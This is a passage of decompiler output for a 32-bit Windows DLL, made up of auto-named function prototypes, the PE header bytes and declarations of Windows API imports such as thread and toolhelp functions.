// _DWORD *__usercall sub_100484EE@<eax>(int *a1@<eax>, _DWORD *a2@<esi>);
// _DWORD *__userpurge sub_10048503@<eax>(_DWORD *a1@<esi>, int a2);
// volatile LONG **__usercall sub_10048559@<eax>(volatile LONG **a1@<ebx>, volatile LONG **a2@<edi>);
// volatile LONG **__userpurge sub_10048582@<eax>(volatile LONG **a1@<edi>, const CHAR *a2);
// int __userpurge sub_10048630@<eax>(BSTR **a1@<eax>, BSTR **a2);
// int __usercall sub_100486A0@<eax>(int a1@<esi>);
// int __userpurge sub_100486B4@<eax>(BSTR *a1@<eax>, BSTR *a2);
_DWORD *__stdcall sub_1004872E(_DWORD *a1, int *a2);
// BOOL __userpurge sub_10048764@<eax>(int a1@<eax>, int a2);
char __thiscall sub_100487AB(int *this, int a2);
BOOL __thiscall sub_100489A5(void *this, int a2);
int __thiscall sub_100489FC(_DWORD *this);
int __stdcall sub_10048A00(int a1, void *a2);
_DWORD *__thiscall sub_10048BCB(_DWORD *Block, char a2);
void *__thiscall sub_10048BEE(_DWORD *this);
_DWORD *__thiscall sub_10048C70(int *this, _DWORD *a2);
_DWORD *__thiscall sub_10048CA7(int *this, _DWORD *a2);
_DWORD *__thiscall sub_10048CDE(int *this, _DWORD *a2);
_DWORD *__thiscall sub_10048D15(int *this, _DWORD *a2);
int __thiscall sub_10048D4C(void *this, int a2, int a3);
_DWORD *__thiscall sub_1004907D(_DWORD *Block, char a2);
int __thiscall sub_100490A0(_DWORD *this);
_DWORD *__thiscall sub_10049144(int *this, _DWORD *a2);
_DWORD *__thiscall sub_1004917B(int *this, _DWORD *a2);
_DWORD *__thiscall sub_100491B2(int *this, _DWORD *a2);
_DWORD *__thiscall sub_100491E9(int *this, _DWORD *a2);
_DWORD *__thiscall sub_10049220(int *this, _DWORD *a2);
_DWORD *__thiscall sub_1004930C(void *this, _DWORD *a2);
int __stdcall sub_1004949F(int a1, int a2);
_DWORD *__thiscall sub_10049885(_DWORD *Block, char a2);
int __thiscall sub_100498A8(_DWORD *this);
bool __cdecl sub_1004994E(int a1);
_DWORD *__thiscall sub_10049A08(int *this, _DWORD *a2);
_DWORD *__thiscall sub_10049A3F(int *this, _DWORD *a2);
_DWORD *__thiscall sub_10049A76(int *this, _DWORD *a2);
_DWORD *__thiscall sub_10049AAD(int *this, _DWORD *a2);
_DWORD *__thiscall sub_10049AE4(int *this, _DWORD *a2);
char sub_10049B1B();
void __thiscall sub_10049B1E(int *this, int a2, int a3);
_DWORD *__thiscall sub_10049CD1(void *this, _DWORD *a2);
// _DWORD *__userpurge sub_10049D29@<eax>(int *a1@<esi>, _DWORD *a2);
_DWORD *__thiscall sub_10049D7F(void *this, _DWORD *a2);
// _DWORD *__userpurge sub_10049DDA@<eax>(int *a1@<esi>, _DWORD *a2);
_DWORD *__thiscall sub_10049E30(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10049E88(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10049EE0(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10049F38(void *this, _DWORD *a2);
// int __userpurge sub_10049F90@<eax>(int a1@<edi>, volatile LONG *a2);
_DWORD *__thiscall sub_10049FE3(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1004A03B(void *this, _DWORD *a2);
// int __userpurge sub_1004A093@<eax>(int a1@<edi>, volatile LONG *a2);
_DWORD *__thiscall sub_1004A0E6(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1004A13E(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1004A196(void *this, _DWORD *a2);
// int __userpurge sub_1004A1EE@<eax>(int a1@<edi>, volatile LONG *a2);
_DWORD *__thiscall sub_1004A241(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1004A299(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1004A2F1(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1004A349(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1004A3A4(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1004A3FF(void *this, _DWORD *a2);
// int __usercall sub_1004A494@<eax>(int a1@<esi>);
// int *__usercall sub_1004A536@<eax>(int a1@<eax>, int *a2@<esi>);
// int *__userpurge sub_1004A598@<eax>(int a1@<ecx>, int *a2@<esi>, int *a3);
int *__thiscall sub_1004A5FD(int *this, int *a2, int *a3);
// int *__userpurge sub_1004A651@<eax>(int a1@<ecx>, int *a2@<esi>, int *a3);
// _DWORD *__usercall sub_1004A6BA@<eax>(_DWORD *a1@<esi>);
// int *__userpurge sub_1004A70A@<eax>(int a1@<ecx>, int *a2@<esi>, int *a3);
// int *__userpurge sub_1004A75F@<eax>(int a1@<ecx>, int *a2@<esi>, int *a3);
// int *__userpurge sub_1004A7B4@<eax>(int a1@<ecx>, int *a2@<esi>, int *a3);
// int *__userpurge sub_1004A809@<eax>(int a1@<ecx>, int *a2@<esi>, int *a3);
void __thiscall sub_1004A88E(void *this);
int *__thiscall sub_1004A8CA(int *this, int *a2, int *a3);
int *__thiscall sub_1004A91E(int *this, int *a2, int *a3);
int *__thiscall sub_1004A972(int *this, int *a2, int *a3);
int __thiscall sub_1004AA66(int *this, int a2);
// _DWORD *__usercall sub_1004AAF0@<eax>(_DWORD *a1@<ecx>, int a2@<edi>);
int __thiscall sub_1004AB3A(int *this, int a2);
int __thiscall sub_1004ABC4(int *this, int a2);
int __thiscall sub_1004AC40(int *this, int a2);
int __thiscall sub_1004ACBC(int *this, int a2);
// void __usercall sub_1004AD38(int a1@<esi>);
// int __userpurge sub_1004AD66@<eax>(_DWORD *a1@<esi>, int a2);
// int *__usercall sub_1004AD81@<eax>(int *a1@<esi>);
// int __userpurge sub_1004AD97@<eax>(_DWORD *a1@<esi>, int a2);
// int *__usercall sub_1004ADB2@<eax>(int *a1@<esi>);
// int __userpurge sub_1004ADC8@<eax>(_DWORD *a1@<esi>, int a2);
// int *__usercall sub_1004ADE3@<eax>(int *a1@<esi>);
// int __userpurge sub_1004ADF9@<eax>(_DWORD *a1@<esi>, int a2);
void __stdcall __noreturn sub_1004AEC0(int a1);
void __stdcall __noreturn sub_1004AED0(int a1, int a2, int a3);
int sub_1004AF50(int a1, int a2, int a3, int a4, int a5, const WCHAR *a6, ...);
BSTR __stdcall sub_1004B040(LPCSTR lpString);
void *__stdcall sub_1004B1D0(LPCWCH lpWideCharStr);
HANDLE __thiscall sub_1004B370(void *this);
void __cdecl __noreturn sub_1004B3B0(int a1, int a2);
_DWORD *__thiscall sub_1004B3F0(_DWORD *this, int a2);
void *__thiscall sub_1004B430(void *Block, char a2);
int __cdecl sub_1004B480(int a1, int a2, int a3, int vt, int a5, LPCWSTR lpString, int a7, _DWORD *a8);
int sub_1004BA60(int a1, int a2, int a3, int a4, int a5, const WCHAR *a6, ...);
// int __userpurge sub_1004BB70@<eax>(int a1@<edi>, ICreateErrorInfo *pperrinfo, _DWORD *a3);
// BOOL __stdcall Thread32First(HANDLE hSnapshot, LPTHREADENTRY32 lpte);
// BOOL __stdcall Thread32Next(HANDLE hSnapshot, LPTHREADENTRY32 lpte);
// HANDLE __stdcall CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
// BOOL __stdcall ConvertStringSecurityDescriptorToSecurityDescriptorW(LPCWSTR StringSecurityDescriptor, DWORD StringSDRevision, PSECURITY_DESCRIPTOR *SecurityDescriptor, PULONG SecurityDescriptorSize);
// BOOL __stdcall ConvertStringSidToSidW(LPCWSTR StringSid, PSID *Sid);
// int __userpurge sub_1004C3EA@<eax>(_BYTE *a1@<eax>, _BYTE *a2@<ecx>, int a3);
int __stdcall sub_1004C43A(_DWORD *a1);
int *__thiscall sub_1004C465(int *this);
int __stdcall sub_1004C548(int *a1, int *Arguments);
int *__thiscall sub_1004C785(int *hMem, char a2);
int __stdcall sub_1004C7A3(char *a1);
int __stdcall sub_1004C83F(char *hLibModule);
// void __stdcall `eh vector destructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *)); weak
// int __cdecl atexit(void (__cdecl *)());
void __cdecl j__free(void *Block);
void __thiscall sub_1004CB83(void *this);
_DWORD *__thiscall sub_1004CB8E(_DWORD *Block, char a2);
std::exception *__thiscall sub_1004CBB0(std::exception *this, const struct std::exception *a2);
// void *__cdecl operator new(size_t Size); weak
// void __stdcall `eh vector constructor iterator'(void *, unsigned int, _DWORD, void (__thiscall *)(void *), void (__thiscall *)(void *)); weak
void __thiscall sub_1004CCA6(struct type_info *this);
struct type_info *__thiscall sub_1004CCB4(struct type_info *Block, char a2);
char *__thiscall sub_1004CD3D(char *this);
// void *__cdecl memset(void *, int Val, size_t Size);
// _LocaleUpdate *__thiscall _LocaleUpdate::_LocaleUpdate(_LocaleUpdate *__hidden this, struct localeinfo_struct *); weak
// size_t __cdecl wcsnlen(const wchar_t *Source, size_t MaxCount);
// size_t __cdecl strnlen(const char *String, size_t MaxCount);
// errno_t __cdecl _wcslwr_s(wchar_t *String, size_t SizeInWords);
// size_t __cdecl wcslen(const wchar_t *String);
// errno_t __cdecl _wcsupr_s_l(wchar_t *String, size_t Size, _locale_t Locale);
errno_t __cdecl sub_1004D79B(wchar_t *String, size_t Size);
// wchar_t *__cdecl wcsrchr(const wchar_t *Str, wchar_t Ch);
// wchar_t *__cdecl wcsstr(const wchar_t *Str, const wchar_t *SubStr);
// static errno_t __cdecl memcpy_s(void *const Destination, const rsize_t DestinationSize, const void *const Source, const rsize_t SourceSize);
// errno_t __cdecl _wcsnset_s(wchar_t *Destination, size_t SizeInWords, wchar_t Value, size_t MaxCount);
void __thiscall sub_1004DA6C(void *this);
// errno_t __cdecl wcscat_s(wchar_t *Destination, rsize_t SizeInWords, const wchar_t *Source);
// void *__cdecl memcpy(void *, const void *Src, size_t Size);
// wchar_t *__cdecl wcschr(const wchar_t *Str, wchar_t Ch);
// int __cdecl wcscmp(const wchar_t *String1, const wchar_t *String2);
// int __cdecl _wcsicmp(const wchar_t *String1, const wchar_t *String2);
// int __cdecl _vsnwprintf_s(wchar_t *const Buffer, const size_t BufferCount, const size_t MaxCount, const wchar_t *const Format, va_list ArgList);
// errno_t __cdecl wcsncpy_s(wchar_t *Destination, rsize_t SizeInWords, const wchar_t *Source, rsize_t MaxCount);
// errno_t __cdecl wcscpy_s(wchar_t *Destination, rsize_t SizeInWords, const wchar_t *Source);
// unsigned int __cdecl wcstoxl(struct localeinfo_struct *, const wchar_t *, const wchar_t **, _DWORD, _DWORD); weak
// int __cdecl wcstol(const wchar_t *String, wchar_t **EndPtr, int Radix);
unsigned int __cdecl sub_1004E709(const wchar_t *a1, const wchar_t **a2, int a3, struct localeinfo_struct *a4);
// __time32_t __cdecl time(__time32_t *const Time);
// void __cdecl srand(unsigned int Seed);
// void (__cdecl *__cdecl _set_se_translator(void (__cdecl *)(unsigned int, struct _EXCEPTION_POINTERS *)))(unsigned int, struct _EXCEPTION_POINTERS *); weak
// _DWORD __cdecl _set_new_mode(_DWORD); weak
int __cdecl sub_1004E8CF(int a1);
// int (__cdecl *__cdecl _set_new_handler(int (__cdecl *)(unsigned int)))(unsigned int); weak
// int __cdecl memcmp(const void *Buf1, const void *Buf2, size_t Size);
// uintptr_t __cdecl _beginthreadex(void *Security, unsigned int StackSize, _beginthreadex_proc_type StartAddress, void *ArgList, unsigned int InitFlag, unsigned int *ThrdAddr);
// size_t __cdecl strlen(const char *Str);
// char *__cdecl strcpy(char *Destination, const char *Source);
// int __cdecl wcsncmp(const wchar_t *String1, const wchar_t *String2, size_t MaxCount);
// void __cdecl free(void *Block);
// void *__cdecl malloc(size_t Size);
// wint_t __cdecl _towupper_l(wint_t C, _locale_t Locale);
wint_t __cdecl sub_10051B60(wint_t C);
void __cdecl j_j__free(void *Block);
int __cdecl sub_10051B73(wchar_t *String);
int __cdecl sub_10051B99(wchar_t *String);
void *__cdecl operator new(size_t Size); // weak
// void __stdcall __noreturn _CxxThrowException(void *pExceptionObject, _ThrowInfo *pThrowInfo);
// _DWORD __cdecl _encode_pointer(_DWORD); weak
// int _encoded_null(void); weak
// _DWORD __cdecl _decode_pointer(_DWORD); weak
int sub_1005255C();
int __cdecl sub_10052D0E(_DWORD *a1);
int __cdecl sub_10052DBD(_DWORD *a1);
int __cdecl sub_10053529(int a1);
// _DWORD __thiscall std::exception::exception(std::exception *__hidden this, const char *const *); weak
// _DWORD __thiscall std::exception::exception(std::exception *__hidden this, const struct std::exception *); weak
void __thiscall sub_10053658(void *this);
std::exception *__thiscall sub_100536B7(std::exception *this, const char *const a2);
std::exception *__thiscall sub_100536D0(std::exception *this, const struct std::exception *a2);
void *__thiscall sub_1005372E(void *Block, char a2);
_DWORD *__thiscall sub_1005374A(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1005376C(_DWORD *Block, char a2);
_DWORD *__thiscall sub_1005378E(_DWORD *Block, char a2);
// void __cdecl type_info::_Type_info_dtor(struct type_info *); weak
void *sub_1005438D();
void __cdecl sub_100543B1(); // idb
int sub_10055354();
int __cdecl sub_10056055(int a1);
// void __cdecl __noreturn _invoke_watson(const wchar_t *Expression, const wchar_t *FunctionName, const wchar_t *FileName, unsigned int LineNo, uintptr_t Reserved);
// int __cdecl _invalid_parameter(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// int *__cdecl _errno();
// void __cdecl __noreturn __report_gsfailure();
// _DWORD __cdecl _unlock(_DWORD); weak
// unsigned __int64 __cdecl wcstoxq(struct localeinfo_struct *, const wchar_t *, const wchar_t **, _DWORD, _DWORD); weak
unsigned __int64 __cdecl sub_1005A6ED(const wchar_t *a1, const wchar_t **a2, int a3, struct localeinfo_struct *a4);
void __thiscall sub_1005A8F4(void *this);
_DWORD *__thiscall sub_1005A8FF(_DWORD *Block, char a2);
std::exception *__thiscall sub_1005B998(std::exception *this, const struct std::exception *a2);
int sub_1005CB7C();
LONG __cdecl sub_1005CF88(LONG a1);
int __cdecl sub_1005D096(int a1);
int __cdecl sub_1005D175(int a1, int a2, int a3);
int sub_1005E690();
char __thiscall sub_1005E694(_BYTE *this);
int __thiscall sub_1005E6B3(_DWORD *this);
int __thiscall sub_1005E70B(_DWORD *this);
// int _get_sse2_info(void); weak
int sub_10063229();
int sub_10064AD3();
void sub_10066480();
void **sub_10066F61();
// _DWORD __cdecl _unlock_file2(_DWORD, _DWORD); weak
// int __cdecl _output_l(int, int, int, int); weak
int sub_10067E69();
// int __cdecl _output_s_l(int, int, int, int); weak
void sub_1006A5A7();
void sub_1006A5B6();
int __cdecl sub_1006A763(_DWORD *a1, int a2, struct localeinfo_struct *a3);
int __cdecl sub_1006A8D6(_DWORD *a1, int a2, struct localeinfo_struct *a3);
int __cdecl sub_1006AE8D(_DWORD *a1);
int __cdecl sub_1006AEC1(_DWORD *a1);
int __cdecl sub_1006AEF5(_DWORD *a1);
int *sub_1006AFCB();
int *sub_1006AFD1();
int *sub_1006AFD7();
void **sub_1006AFDD();
int sub_1006C364();
// _DWORD __cdecl flsall(_DWORD); weak
int sub_1006C5DD();
// _DWORD __cdecl vprintf_helper(_DWORD, _DWORD, _DWORD, _DWORD); weak
int __cdecl sub_1006CAA4(int a1, int a2, int a3);
int __cdecl sub_1006CABE(int a1, int a2, int a3);
int __cdecl sub_1006CAD8(int a1, int a2, int a3);
// int __cdecl _output_p_l(FILE *Stream, int, int, int); weak
// unsigned int __cdecl strtoxl(struct localeinfo_struct *, const char *, const char **, _DWORD, _DWORD); weak
unsigned int __cdecl sub_1006DF9A(const char *a1, const char **a2, int a3, struct localeinfo_struct *a4);
int __cdecl sub_1006E7B9(unsigned __int16 *a1, _DWORD *a2);
int __cdecl sub_1006ECFB(unsigned __int16 *a1, _DWORD *a2);
// _DWORD __cdecl __strgtold12_l(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// unsigned __int64 __cdecl strtoxq(struct localeinfo_struct *, const char *, const char **, _DWORD, _DWORD); weak
unsigned __int64 __cdecl sub_10071C3B(const char *a1, const char **a2, int a3, struct localeinfo_struct *a4);
int sub_10071ECB();
bool __cdecl __uncaught_exception(); // weak
// int __stdcall GetModuleBaseNameW(_DWORD, _DWORD, _DWORD, _DWORD); weak
int __stdcall sub_1007358F(int a1, int a2, int a3);
int __stdcall sub_10073612(int a1);
// int __userpurge sub_10073C16@<eax>(int a1@<edi>, int a2);
void __cdecl sub_10073D49(int a1);
int __stdcall sub_10073DAF(int a1);
int sub_100871D0();
int sub_100871F2();
int sub_10087214();
int sub_10087611();
int sub_10087633();
int sub_10087655();
int sub_100877AE();
int sub_100877D0();
int sub_1008795D();
int sub_1008797F();
int sub_10088346();
int sub_10088360();
int sub_1008837B();
int sub_10088393();
int sub_100883B5();
int sub_100883D7();
int sub_100883F9();
int sub_1008841B();
int sub_1008843D();
int sub_1008845F();
int sub_10088481();
int sub_1008849B();
int sub_100884B1();
int sub_100884BD();
int sub_100884DF();
int sub_10088520();
int sub_10088542();
int sub_10088564();
int sub_10088586();
int sub_100885A8();
int sub_100885CA();
int sub_100885EC();
int sub_1008860E();
int sub_10088630();
int sub_100886C4();
int sub_10088758();
int sub_1008877A();
int sub_1008879C();
int sub_100887B2();
int sub_100887BE();
int sub_10088840();
int sub_100888C2();
int sub_100888E4();
int sub_10088906();
int sub_10088A11();
int sub_10088A29();
int sub_10088A41();
int sub_10088A59();
int sub_10088A7B();
int sub_10088A9D();
int sub_10088ABF();
int sub_10088AE1();
int sub_10088B63();
int sub_10088B85();
int sub_10088BA7();
int sub_10088BC9();
int sub_10088BEB();
int sub_10088C01();
int sub_10088C0D();
int sub_10088C2F();
int sub_10088C51();
int sub_10088C73();
int sub_10088C95();
int sub_10088CB7();
int sub_10088CD9();
int sub_10088CFB();
int sub_10088D11();
int sub_10088D1D();
int sub_10088D35();
int sub_10088D57();
int sub_10088D79();
int sub_10088D9B();
int sub_10088DBD();
int sub_10088DDF();
int sub_10088E01();
int sub_10088E23();
int sub_10088E45();
int sub_10088E67();
int sub_10088E89();
int sub_10088E95();
int sub_10088EB7();
int sub_10088ED9();
int sub_10088EFB();
int sub_10088F1D();
int sub_10088F3F();
int sub_10088F57();
char *sub_10088F79();
char *sub_10088F8A();
int sub_10088F9B();
int sub_10088FBD();
int sub_10088FDF();
int sub_10089001();
int sub_10089017();
int sub_10089039();
int sub_10089073();
int sub_1008908E();
int sub_100890A9();
int sub_100890CB();
int sub_100890ED();
int sub_1008910F();
int sub_10089131();
int sub_10089153();
int sub_10089175();
int sub_10089190();
int sub_100891B2();
int sub_100891CD();
int sub_100891EF();
int sub_1008921B();
int sub_1008923D();
int sub_1008925F();
int sub_10089281();
int sub_100892A3();
int sub_100892C5();
int sub_100892E7();
int sub_10089309();
int sub_1008932B();
int sub_1008934D();
int sub_1008936F();
int sub_10089391();
int sub_100893B3();
int sub_100893D5();
int sub_100893EF();
int sub_10089409();
int sub_1008942B();
int sub_10089450();
void __cdecl sub_10089460(); // idb
void __cdecl sub_1008946A(); // idb
void __cdecl sub_10089474(); // idb
void __cdecl sub_10089488(); // idb
void __cdecl sub_10089492(); // idb
void __cdecl sub_1008949C(); // idb
void __cdecl sub_100894B0(); // idb
void __cdecl sub_100894BA(); // idb
void __cdecl sub_100894CE(); // idb
void __cdecl sub_100894D8(); // idb
void __cdecl sub_100894EC(); // idb
void __cdecl sub_100894F6(); // idb
void __cdecl sub_10089500(); // idb
void __cdecl sub_1008950A(); // idb
void __cdecl sub_10089514(); // idb
void __cdecl sub_1008951E(); // idb
void __cdecl sub_10089528(); // idb
void __cdecl sub_10089532(); // idb
void __cdecl sub_1008953C(); // idb
void __cdecl sub_10089546(); // idb
void __cdecl sub_10089550(); // idb
void __cdecl sub_1008955A(); // idb
void __cdecl sub_10089564(); // idb
void __cdecl sub_1008956E(); // idb
void __cdecl sub_10089578(); // idb
void __cdecl sub_10089583(); // idb
void __cdecl sub_1008958D(); // idb
void __cdecl sub_10089597(); // idb
void __cdecl sub_100895A1(); // idb
void __cdecl sub_100895AB(); // idb
void __cdecl sub_100895B5(); // idb
void __cdecl sub_100895BF(); // idb
void __cdecl sub_100895C9(); // idb
void __cdecl sub_100895D3(); // idb
void __cdecl sub_100895DE(); // idb
void __cdecl sub_100895E9(); // idb
void __cdecl sub_100895F3(); // idb
void __cdecl sub_100895FD(); // idb
void __cdecl sub_10089607(); // idb
void __cdecl sub_10089611(); // idb
void __cdecl sub_1008961C(); // idb
void __cdecl sub_10089627(); // idb
void __cdecl sub_10089631(); // idb
void __cdecl sub_1008963B(); // idb
void __cdecl sub_1008964F(); // idb
void __cdecl sub_10089659(); // idb
void __cdecl sub_10089663(); // idb
void __cdecl sub_1008966D(); // idb
void __cdecl sub_10089677(); // idb
void __cdecl sub_10089681(); // idb
void __cdecl sub_1008968B(); // idb
void __cdecl sub_10089695(); // idb
void __cdecl sub_1008969A(); // idb
void __cdecl sub_100896A4(); // idb
void __cdecl sub_100896AE(); // idb
void __cdecl sub_100896B8(); // idb
void __cdecl sub_100896C2(); // idb
void __cdecl sub_100896CC(); // idb
void __cdecl sub_100896D6(); // idb
void __cdecl sub_100896E0(); // idb
void __cdecl sub_100896EA(); // idb
void __cdecl sub_100896F4(); // idb
void __cdecl sub_100896FE(); // idb
void __cdecl sub_10089708(); // idb
void __cdecl sub_10089712(); // idb
void __cdecl sub_1008971C(); // idb
void __cdecl sub_10089726(); // idb
void __cdecl sub_10089730(); // idb
void __cdecl sub_1008973A(); // idb
void __cdecl sub_10089744(); // idb
void __cdecl sub_1008974E(); // idb
void __cdecl sub_10089758(); // idb
void __cdecl sub_10089762(); // idb
void __cdecl sub_1008976C(); // idb
void __cdecl sub_10089776(); // idb
void __cdecl sub_10089780(); // idb
void __cdecl sub_1008978A(); // idb
void __cdecl sub_10089794(); // idb
void __cdecl nullsub_4(); // idb
void __cdecl sub_1008979F(); // idb
void __cdecl sub_100897A9(); // idb
void __cdecl sub_100897B3(); // idb
void __cdecl sub_100897BD(); // idb
void __cdecl sub_100897C7(); // idb
void __cdecl sub_100897D1(); // idb
void __cdecl sub_100897DB(); // idb
void __cdecl sub_100897E5(); // idb
void __cdecl sub_100897EF(); // idb
void __cdecl sub_100897F9(); // idb
void __cdecl sub_10089803(); // idb
void __cdecl sub_1008980D(); // idb
void __cdecl sub_10089817(); // idb
void __cdecl sub_10089821(); // idb
void __cdecl sub_1008982B(); // idb
void __cdecl sub_10089835(); // idb
void __cdecl sub_1008983F(); // idb
void __cdecl sub_10089849(); // idb
void __cdecl sub_10089853(); // idb
void __cdecl sub_1008985D(); // idb
void __cdecl sub_10089867(); // idb
void __cdecl sub_10089871(); // idb
void __cdecl sub_1008987B(); // idb
void __cdecl sub_10089885(); // idb
void __cdecl sub_1008988F(); // idb
void __cdecl sub_10089899(); // idb
void __cdecl sub_100898A3(); // idb
void __cdecl sub_100898AD(); // idb
void __cdecl sub_100898B7(); // idb
void __cdecl sub_100898C1(); // idb
void __cdecl sub_100898CB(); // idb
void __cdecl sub_100898D5(); // idb
void __cdecl sub_100898DF(); // idb
void __cdecl sub_100898E9(); // idb
void __cdecl sub_100898F3(); // idb
void __cdecl sub_100898FD(); // idb
void __cdecl sub_10089907(); // idb
void __cdecl sub_10089911(); // idb
void __cdecl sub_1008991B(); // idb
void __cdecl sub_10089925(); // idb
void __cdecl sub_1008992F(); // idb
void __cdecl sub_10089939(); // idb
void __cdecl sub_10089943(); // idb
void __cdecl sub_10089950(); // idb
void __cdecl sub_1008995C(); // idb

//-------------------------------------------------------------------------
// Data declarations

__int16 _ImageBase = 23117; // weak
__int16 word_10000002 = 144; // weak
int *off_1000003C = (int *)0xF8; // weak
char byte_10000040[184] =
{
  '\x0E',
  '\x1F',
  '\xBA',
  '\x0E',
  '\0',
  '\xB4',
  '\t',
  '\xCD',
  '!',
  '\xB8',
  '\x01',
  'L',
  '\xCD',
  '!',
  'T',
  'h',
  'i',
  's',
  ' ',
  'p',
  'r',
  'o',
  'g',
  'r',
  'a',
  'm',
  ' ',
  'c',
  'a',
  'n',
  'n',
  'o',
  't',
  ' ',
  'b',
  'e',
  ' ',
  'r',
  'u',
  'n',
  ' ',
  'i',
  'n',
  ' ',
  'D',
  'O',
  'S',
  ' ',
  'm',
  'o',
  'd',
  'e',
  '.',
  '\r',
  '\r',
  '\n',
  '$',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\x86',
  '\x14',
  '\x12',
  '\x88',
  '\xC2',
  'u',
  '|',
  '\xDB',
  '\xC2',
  'u',
  '|',
  '\xDB',
  '\xC2',
  'u',
  '|',
  '\xDB',
  '\xE5',
  '\xB3',
  '\x01',
  '\xDB',
  '\xD5',
  'u',
  '|',
  '\xDB',
  '\xE5',
  '\xB3',
  '\x11',
  '\xDB',
  'D',
  'u',
  '|',
  '\xDB',
  '\xE5',
  '\xB3',
  '\a',
  '\xDB',
  '\xC1',
  'u',
  '|',
  '\xDB',
  '\xE5',
  '\xB3',
  '\x12',
  '\xDB',
  '\x84',
  'u',
  '|',
  '\xDB',
  '\xC2',
  'u',
  '}',
  '\xDB',
  '5',
  'u',
  '|',
  '\xDB',
  '\xE5',
  '\xB3',
  '\x0E',
  '\xDB',
  '`',
  'u',
  '|',
  '\xDB',
  '\xE5',
  '\xB3',
  '\x06',
  '\xDB',
  '\xC3',
  'u',
  '|',
  '\xDB',
  '\xE5',
  '\xB3',
  '\0',
  '\xDB',
  '\xC3',
  'u',
  '|',
  '\xDB',
  '\xE5',
  '\xB3',
  '\x04',
  '\xDB',
  '\xC3',
  'u',
  '|',
  '\xDB',
  'R',
  'i',
  'c',
  'h',
  '\xC2',
  'u',
  '|',
  '\xDB',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
char byte_10073611 = '\xCC'; // weak
char byte_10073C15 = '\xCC'; // weak
char byte_10073D48 = '\xCC'; // weak
char byte_10073DAE = '\xCC'; // weak
char byte_10073DDA[6] = { '\xCC', '\xCC', '\xCC', '\xCC', '\xCC', '\xCC' }; // weak
_UNKNOWN loc_10074663; // weak
_UNKNOWN loc_10074687; // weak
_UNKNOWN loc_10074717; // weak
_UNKNOWN loc_100749CF; // weak
_UNKNOWN loc_100749F3; // weak
_UNKNOWN loc_10074A83; // weak
_UNKNOWN loc_10074BA9; // weak
_UNKNOWN loc_10074BCD; // weak
_UNKNOWN loc_10074C5D; // weak
_UNKNOWN loc_10074F33; // weak
_UNKNOWN loc_10074F57; // weak
_UNKNOWN loc_10074F7B; // weak
_UNKNOWN loc_10074F9F; // weak
_UNKNOWN loc_10074FC3; // weak
_UNKNOWN loc_10074FE7; // weak
_UNKNOWN loc_1007500B; // weak
_UNKNOWN loc_1007502F; // weak
_UNKNOWN loc_10075053; // weak
_UNKNOWN loc_10075077; // weak
_UNKNOWN loc_1007514D; // weak
_UNKNOWN loc_1007527F; // weak
_UNKNOWN loc_100753B1; // weak
_UNKNOWN loc_100754E3; // weak
_UNKNOWN loc_10075615; // weak
_UNKNOWN loc_100756DB; // weak
_UNKNOWN loc_10075735; // weak
_UNKNOWN loc_100782A7; // weak
_UNKNOWN loc_1007831E; // weak
_UNKNOWN loc_1007837E; // weak
_UNKNOWN loc_100783A2; // weak
_UNKNOWN loc_1007845A; // weak
_UNKNOWN loc_100785B5; // weak
_UNKNOWN loc_100785ED; // weak
_UNKNOWN loc_10078611; // weak
_UNKNOWN loc_100786A1; // weak
_UNKNOWN loc_100787CD; // weak
_UNKNOWN loc_100787F1; // weak
_UNKNOWN loc_10078881; // weak
_UNKNOWN loc_1007896D; // weak
_UNKNOWN loc_10078991; // weak
_UNKNOWN loc_10078A21; // weak
_UNKNOWN loc_10078BD3; // weak
_UNKNOWN loc_10078BF7; // weak
_UNKNOWN loc_10078CAA; // weak
_UNKNOWN loc_10078DC0; // weak
_UNKNOWN loc_10079165; // weak
_UNKNOWN loc_100791EB; // weak
_UNKNOWN loc_100791FF; // weak
_UNKNOWN loc_10079213; // weak
_UNKNOWN loc_100792DF; // weak
_UNKNOWN loc_100792F3; // weak
_UNKNOWN loc_1007933F; // weak
_UNKNOWN loc_1007A72F; // weak
_UNKNOWN loc_1007A7EB; // weak
_UNKNOWN loc_1007A868; // weak
_UNKNOWN loc_1007AC5A; // weak
_UNKNOWN loc_1007AD00; // weak
_UNKNOWN loc_1007ADBE; // weak
_UNKNOWN loc_1007AE1B; // weak
_UNKNOWN loc_1007BA63; // weak
_UNKNOWN loc_1007F46F; // weak
_UNKNOWN loc_1007F4C6; // weak
// extern DWORD (__stdcall *GetTickCount)();
// extern LONG (__stdcall *InterlockedDecrement)(volatile LONG *lpAddend);
// extern int (__stdcall *WideCharToMultiByte)(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
// extern int (__stdcall *MultiByteToWideChar)(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// extern BOOL (__stdcall *TerminateThread)(HANDLE hThread, DWORD dwExitCode);
// extern DWORD (__stdcall *SuspendThread)(HANDLE hThread);
// extern DWORD (__stdcall *ResumeThread)(HANDLE hThread);
// extern HANDLE (__stdcall *OpenThread)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId);
// extern BOOL (__stdcall *GetExitCodeThread)(HANDLE hThread, LPDWORD lpExitCode);
